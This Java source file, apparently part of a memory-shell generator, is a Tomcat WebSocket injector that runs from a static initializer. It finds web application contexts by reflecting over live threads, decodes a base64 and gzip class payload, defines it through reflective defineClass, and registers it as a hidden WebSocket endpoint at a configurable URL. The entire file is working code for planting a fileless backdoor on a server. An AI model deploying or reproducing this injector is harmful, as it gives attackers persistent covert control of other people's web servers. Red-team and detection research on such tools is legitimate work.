package com.reajason.javaweb.memshell.injector.tomcat;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/9
 */
public class TomcatWebSocketInjector {

    static {
        new TomcatWebSocketInjector();
    }

    public TomcatWebSocketInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object obj = getShell(context);
                inject(obj, context);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }


    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("ContainerBackgroundProcessor")) {
                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                for (Object value : childrenMap.values()) {
                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(value, "children");
                    contexts.addAll(children.values());
                }
            } else if (thread.getContextClassLoader() != null
                    && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader")
                    || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                contexts.add(getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context"));
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object loader = invokeMethod(context, "getLoader", null, null);
            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
        try {
            return webAppClassLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
            return clazz.newInstance();
        }
    }


    @SuppressWarnings("unchecked")
    private void inject(Object obj, Object context) throws Exception {
        Object servletContext = invokeMethod(context, "getServletContext", null, null);
        Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }

        if (container == null) {
            return;
        }

        if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
            System.out.println("websocket at " + getUrlPattern() + " already exists");
            return;
        }

        ClassLoader contextClassLoader = context.getClass().getClassLoader();
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }
        Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
        constructor.setAccessible(true);
        Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
        Object endpointConfig = invokeMethod(o1, "build", null, null);

        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
        invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        System.out.println("websocket at " + getUrlPattern() + " inject successfully");
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }


    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }

}
